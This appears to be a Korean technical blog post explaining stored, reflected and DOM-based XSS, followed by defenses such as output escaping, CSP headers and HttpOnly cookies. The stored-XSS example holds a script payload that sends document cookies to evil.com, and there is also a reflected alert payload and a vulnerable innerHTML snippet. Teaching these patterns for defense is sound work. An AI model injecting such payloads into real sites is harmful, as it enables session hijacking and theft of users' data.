---
id: 2
title: XSS 공격 유형과 방어 전략
category: security
date: 2025.03.15
readTime: 12분
desc: Stored, Reflected, DOM-based XSS의 차이점을 이해하고, 실무에서 적용 가능한 방어 전략을 정리합니다.
tags: security, xss, web
---

## XSS란

크로스 사이트 스크립팅(XSS)은 공격자가 웹 애플리케이션에 악성 스크립트를 삽입하는 공격 기법입니다.

## 공격 유형 분류

### Stored XSS

악성 스크립트가 데이터베이스에 저장되어, 다른 사용자가 해당 페이지에 접근할 때 실행됩니다.

```html
<!-- 공격자가 댓글에 삽입 -->
<script>fetch('https://evil.com?c=' + document.cookie)</script>
```

### Reflected XSS

URL 파라미터를 통해 서버가 그대로 응답에 포함시키는 방식입니다.

```
https://example.com/search?q=<script>alert(1)</script>
```

### DOM-based XSS

서버를 거치지 않고 클라이언트 측 JavaScript에서 발생합니다.

```js
// 취약한 코드
document.getElementById('output').innerHTML = location.hash;
```

## 방어 전략

### 1. 입력 검증 및 출력 이스케이프

사용자 입력은 반드시 **이스케이프 처리** 후 출력해야 합니다.

```js
function escapeHtml(str) {
  return str.replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#x27;'
  })[c]);
}
```

### 2. Content Security Policy

CSP 헤더를 설정하면 외부 스크립트 실행을 원천 차단할 수 있습니다.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 3. HttpOnly 쿠키

세션 쿠키에 `HttpOnly` 플래그를 설정하면 JavaScript에서 접근할 수 없습니다.

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

## 마치며

XSS는 OWASP Top 10에 꾸준히 포함되는 위협입니다. 프레임워크의 자동 이스케이프에만 의존하지 말고, 근본적인 원리를 이해하는 것이 중요합니다.
